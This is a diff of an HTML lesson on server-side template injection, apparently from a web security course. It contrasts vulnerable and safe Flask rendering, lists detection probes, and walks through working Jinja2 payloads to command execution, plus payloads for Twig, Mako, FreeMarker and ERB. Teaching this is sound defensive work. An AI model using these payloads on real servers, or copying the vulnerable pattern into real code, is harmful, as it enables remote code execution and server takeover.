@@ -1,11 +1,23 @@
 <section class="module-header">
-  <h1>Module 10 — Server-Side Template Injection</h1>
+  <h1>Module 13 — Server-Side Template Injection (SSTI)</h1>
   <p>Explore how unsanitized user input in template engines can lead to remote code execution.</p>
 </section>
 
 <section class="theory-section">
-  <h2>What Are Template Engines?</h2>
-  <p>Template engines allow developers to embed dynamic content in HTML pages. They use special syntax to insert variables, run loops, and execute logic. Popular engines include:</p>
+
+  <h2>When Templates Become Code Execution</h2>
+  <p>
+    Template engines are everywhere in web development. Every time you see a webpage that says "Hello, Alice!" with your actual name, a template engine probably generated that page. Jinja2 in Python/Flask, Twig in PHP, ERB in Ruby on Rails, Handlebars in Node.js — they all do the same thing: take a template with placeholder variables and fill in the values.
+  </p>
+  <p>
+    The problem starts when a developer makes a subtle but catastrophic mistake: instead of passing user input <em>as a variable</em> to the template engine, they concatenate it <em>into the template itself</em>. This means the user's input is not treated as data — it is treated as <strong>template code</strong>. And template code can do a lot more than just display text.
+  </p>
+  <p>
+    SSTI is like SQL injection's lesser-known cousin. The pattern is identical: user input ends up in a place where it is interpreted as code instead of data. But while SQLi targets the database, SSTI targets the template engine — and through the template engine, often the entire server.
+  </p>
+
+  <h2>Template Engines at a Glance</h2>
+  <p>Different frameworks use different template engines, and each has its own syntax:</p>
 
   <div class="table-wrapper">
     <table>
@@ -17,65 +29,122 @@
         <tr><td>ERB</td><td>Ruby</td><td><code>&lt;%= expr %&gt;</code></td><td><code>&lt;%# comment %&gt;</code></td></tr>
         <tr><td>Pug/Jade</td><td>JS</td><td><code>#{ expr }</code></td><td><code>//- comment</code></td></tr>
         <tr><td>Handlebars</td><td>JS</td><td><code>{{ expr }}</code></td><td><code>{{!-- comment --}}</code></td></tr>
+        <tr><td>FreeMarker</td><td>Java</td><td><code>${ expr }</code></td><td><code>&lt;#-- comment --&gt;</code></td></tr>
       </tbody>
     </table>
   </div>
 
-  <h2>How SSTI Occurs</h2>
-  <p>SSTI happens when user input is concatenated directly into a template string <strong>before</strong> rendering, rather than being passed as a safe variable:</p>
+  <h2>The Vulnerable Pattern</h2>
+  <p>
+    The critical question is: <strong>is user input part of the template, or is it a variable passed to the template?</strong>
+  </p>
 
-  <h3 class="text-red">Vulnerable Code</h3>
+  <h3 class="text-red">Vulnerable Code — Input Becomes Template</h3>
   <pre><code class="language-python">from flask import Flask, request, render_template_string
 
 @app.route('/greet')
 def greet():
     name = request.args.get('name', 'World')
-    # DANGEROUS: user input becomes part of the template itself
+    # DANGEROUS: user input is concatenated INTO the template
     template = f"Hello {name}! Welcome to our site."
-    return render_template_string(template)</code></pre>
+    return render_template_string(template)
 
-  <h3 class="text-green">Safe Code</h3>
+# If name = "{{7*7}}", the template becomes:
+# "Hello {{7*7}}! Welcome to our site."
+# Jinja2 evaluates {{7*7}} → the page shows "Hello 49!"</code></pre>
+
+  <h3 class="text-green">Safe Code — Input Is a Variable</h3>
   <pre><code class="language-python">@app.route('/greet')
 def greet():
     name = request.args.get('name', 'World')
-    # SAFE: user input passed as a variable to render
-    return render_template_string("Hello {{ name }}!", name=name)</code></pre>
+    # SAFE: user input passed as a variable — never evaluated as template code
+    return render_template_string("Hello {{ name }}!", name=name)
 
-  <h2>Detection Probes</h2>
-  <p>To detect SSTI, inject mathematical expressions in various template syntaxes and check if the server evaluates them:</p>
+# If name = "{{7*7}}", the page shows "Hello {{7*7}}!"
+# The curly braces are treated as literal text, not template syntax</code></pre>
+
+  <p>
+    The difference is one line of code. In the vulnerable version, the f-string puts the user input into the template string <em>before</em> Jinja2 sees it, so Jinja2 thinks it is template code. In the safe version, Jinja2 knows exactly which parts are template code and which are data.
+  </p>
+
+  <h2>Detecting SSTI</h2>
+  <p>
+    The first step in exploiting SSTI is detecting it. You inject mathematical expressions in various template syntaxes and see if the server evaluates them. If you send <code>{{7*7}}</code> and the page shows <code>49</code>, you have confirmed SSTI.
+  </p>
 
   <div class="table-wrapper">
     <table>
       <thead><tr><th>Probe</th><th>Expected if Vulnerable</th><th>Engine(s)</th></tr></thead>
       <tbody>
-        <tr><td><code>{{7*7}}</code></td><td><code>49</code></td><td>Jinja2, Twig</td></tr>
-        <tr><td><code>{{7*'7'}}</code></td><td><code>7777777</code></td><td>Jinja2 (string repeat)</td></tr>
-        <tr><td><code>${7*7}</code></td><td><code>49</code></td><td>Mako, FreeMarker</td></tr>
+        <tr><td><code>{{7*7}}</code></td><td><code>49</code></td><td>Jinja2, Twig, Handlebars</td></tr>
+        <tr><td><code>{{7*'7'}}</code></td><td><code>7777777</code></td><td>Jinja2 specifically (Python string multiplication)</td></tr>
+        <tr><td><code>${7*7}</code></td><td><code>49</code></td><td>Mako, FreeMarker, Thymeleaf</td></tr>
         <tr><td><code>&lt;%= 7*7 %&gt;</code></td><td><code>49</code></td><td>ERB (Ruby)</td></tr>
         <tr><td><code>#{7*7}</code></td><td><code>49</code></td><td>Pug/Jade</td></tr>
+        <tr><td><code>${{7*7}}</code></td><td><code>49</code></td><td>Thymeleaf (Spring)</td></tr>
       </tbody>
     </table>
   </div>
 
-  <h2>Jinja2 Exploitation Chain</h2>
-  <p>Once you confirm Jinja2 SSTI, you can traverse Python's object hierarchy to access powerful classes:</p>
-  <pre><code class="language-python"># Step 1: Access the string class
+  <div class="callout callout-info">
+    <strong>The Polyglot Probe:</strong> A useful universal test is <code>${{7*7}}</code> — the dollar sign and double braces cover multiple engine syntaxes at once. If you see <code>49</code> in the response, you know SSTI exists. The specific syntax that triggered it tells you which engine is in use.
+  </div>
+
+  <h2>Jinja2 Exploitation — From Math to RCE</h2>
+  <p>
+    OK, so you can make the server compute <code>7*7</code>. That is cute. But how do you go from evaluating arithmetic to executing operating system commands? In Jinja2 (Python), you exploit Python's object model to traverse the class hierarchy and find dangerous classes.
+  </p>
+  <p>
+    Here is the thought process, step by step:
+  </p>
+
+  <pre><code class="language-python"># Step 1: Start with any Python object — an empty string works
 {{ ''.__class__ }}
-# → &lt;class 'str'&gt;
+# Output: &lt;class 'str'&gt;
+# We now have a reference to the str class
 
-# Step 2: Traverse to the base object
+# Step 2: Go up the class hierarchy to the root "object" class
 {{ ''.__class__.__mro__ }}
-# → (&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+# Output: (&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+# __mro__ = Method Resolution Order — the inheritance chain
 
-# Step 3: List all subclasses of object
+# Step 3: From "object", list ALL classes in the Python runtime
 {{ ''.__class__.__mro__[1].__subclasses__() }}
-# → [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ... hundreds of classes]
+# Output: [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ... HUNDREDS of classes]
+# Every class that inherits from "object" is listed here
 
-# Step 4: Find useful classes (like subprocess, file readers)
-# and use them for RCE or file read</code></pre>
+# Step 4: Find a class that can execute commands
+# Look for subprocess.Popen, os._wrap_close, etc.
+# The index varies by Python version — you need to find it
+
+# Step 5: Execute a command
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
+# Output: (b'uid=1000(app) gid=1000(app)\n', None)</code></pre>
+
+  <p>
+    This looks complicated, but the logic is straightforward: start with any object, climb to the root of the class hierarchy, enumerate all available classes, find one that can run commands, and use it. There are shorter payloads that accomplish the same thing:
+  </p>
+
+  <pre><code class="language-python"># Shorter RCE payloads for Jinja2:
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
 
   <div class="callout callout-warning">
-    <strong>Impact:</strong> Successful SSTI can lead to Remote Code Execution (RCE), reading sensitive files, extracting environment variables and secrets, and full server compromise.
+    <strong>Jinja2 Sandboxing:</strong> Jinja2 has a <code>SandboxedEnvironment</code> that restricts access to dangerous attributes. However, sandbox escapes have been found repeatedly — for example, accessing <code>__globals__</code> through unexpected paths. Never rely on the sandbox as your only defense. The real fix is to never put user input into the template string.
+  </div>
+
+  <h2>SSTI Beyond Jinja2</h2>
+  <p>Other template engines have their own exploitation paths:</p>
+  <ul>
+    <li><strong>Twig (PHP):</strong> <code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></li>
+    <li><strong>Mako (Python):</strong> Uses <code>${}</code> syntax and has direct Python code execution with <code>&lt;% import os; os.popen('id').read() %&gt;</code></li>
+    <li><strong>FreeMarker (Java):</strong> <code>${"freemarker.template.utility.Execute"?new()("id")}</code></li>
+    <li><strong>ERB (Ruby):</strong> <code>&lt;%= system('id') %&gt;</code> — almost trivially exploitable since ERB evaluates Ruby code directly</li>
+  </ul>
+
+  <div class="callout callout-danger">
+    <strong>Impact:</strong> SSTI almost always leads to <strong>Remote Code Execution (RCE)</strong>. From there, the attacker can read sensitive files (<code>/etc/passwd</code>, application secrets), extract environment variables (API keys, database credentials), pivot to internal services, install backdoors, or completely take over the server. SSTI is a critical severity vulnerability.
   </div>
 
   <h2>Engine Identification Flowchart</h2>
